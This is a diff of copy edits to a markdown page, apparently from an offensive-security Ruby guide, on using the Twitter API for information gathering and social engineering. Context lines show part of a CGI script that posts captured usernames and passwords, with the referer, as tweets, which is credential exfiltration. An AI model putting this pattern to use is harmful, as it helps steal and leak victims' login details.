@@ -1,7 +1,7 @@
 # Twitter API
-Dealing with twitter API's s really useful due information gathering, taxonomy and social engineering. However, you have to have some keys and tokens in-order to interact with twitter APIs. To do so, please refer to the official [twitter development page][1].
+Dealing with Twitter's API is really useful for information gathering, taxonomy and social engineering. However, you have to have some keys and tokens in-order to interact with Twitter's APIs. To do so, please refer to the official [Twitter development page][1].
 
-- To install twitter API
+- To install Twitter API
 ```
 gem install twitter
 ```
@@ -61,7 +61,7 @@ client.user("KINGSABRI")
 
 if cgi.referer.nil? or cgi.referer.empty?
     # Twitter notification | WARNING! It's tweets, make sure your account is protected!!!
-    client.update("[Info] No Refere!\n" + "#{CGI.unescape user}:#{CGI.unescape pass}")
+    client.update("[Info] No Referer!\n" + "#{CGI.unescape user}:#{CGI.unescape pass}")
 else
     client.update("[Info] #{cgi.referer}\n #{CGI.unescape user}:#{CGI.unescape pass}")
 end
